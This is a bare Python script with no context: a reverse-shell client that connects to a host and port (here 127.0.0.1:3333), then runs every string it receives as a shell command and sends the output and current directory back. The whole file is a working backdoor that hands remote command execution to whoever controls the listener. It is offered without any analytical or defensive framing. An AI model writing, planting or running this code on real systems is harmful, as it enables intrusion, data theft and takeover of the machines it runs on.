#!/usr/bin/env python

import socket
import subprocess
import sys
import os

def Main():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = '127.0.0.1'
    port = 3333
    client_socket.connect((host, port))

    while True:
        data = client_socket.recv(1024)
        if data[:2].decode("utf-8") == "cd":
            decoded_data = data[3:].decode("utf-8")
            decoded_path = os.path.expanduser(decoded_data)
            os.chdir(decoded_path)
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out_bytes = cmd.stdout.read() + cmd.stderr.read()
            out_str = str(out_bytes, "utf-8")
            client_socket.send(str.encode(out_str + str(os.getcwd()) + '> '))

    client_socket.close()

if __name__ == '__main__':
    Main()
